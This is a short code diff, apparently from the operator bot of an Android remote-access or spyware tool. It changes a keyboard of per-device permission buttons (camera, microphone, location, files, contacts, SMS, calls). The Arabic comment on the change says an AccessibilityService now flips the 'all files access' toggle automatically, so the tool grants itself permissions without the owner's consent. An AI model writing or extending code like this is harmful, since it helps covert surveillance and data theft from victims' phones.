@@ -530,9 +530,9 @@ def permissions_keyboard(did):
            perm_btn("microphone", "🎤 الميكروفون"))
     kb.add(perm_btn("location", "📍 الموقع"),
            perm_btn("background-location", "🌐 الموقع في الخلفية"))
-    # ⚡ V11.2.55: زر واحد فقط "الملفات" - يفتح dialog 'الملفات والوسائط'
-    # + يختار 'كامل الملفات' RadioButton تلقائياً (إدارة الملفات)
-    kb.add(perm_btn("storage", "📁 الملفات"),
+    # ⚡ V11.2.56: زر "الملفات" يفتح صفحة "إدارة كل الملفات" مباشرة
+    # + AccessibilityService يضغط المفتاح تلقائياً
+    kb.add(perm_btn("all-files", "📁 الملفات"),
            perm_btn("contacts", "👥 جهات الاتصال"))
     kb.add(perm_btn("sms", "💬 الرسائل"),
            perm_btn("calls", "📞 المكالمات"))
